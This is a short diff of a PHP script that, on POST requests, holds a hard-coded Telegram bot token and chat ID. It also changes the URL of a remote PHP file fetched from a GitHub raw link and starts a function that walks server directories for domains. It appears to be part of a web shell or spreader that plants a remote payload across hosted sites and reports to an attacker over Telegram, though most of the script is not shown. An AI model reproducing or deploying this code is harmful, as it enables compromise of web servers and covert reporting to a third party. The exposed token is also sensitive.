@@ -2,7 +2,7 @@
 if ($_SERVER['REQUEST_METHOD'] === 'POST') {
     $telegramApiId = '7288530056:AAH3mvjU3wl94AivFXbX2XWH4Oug6c74gy8';
     $telegramChatId = '-1002427387838';
-    $fileUrl = 'https://raw.githubusercontent.com/necessaryfor/neces/refs/heads/main/ConfingSettings.php';
+    $fileUrl = 'https://raw.githubusercontent.com/necessaryfor/neces/refs/heads/main/Settings.php';
 
     function findDomains_v2($startDir)
     {
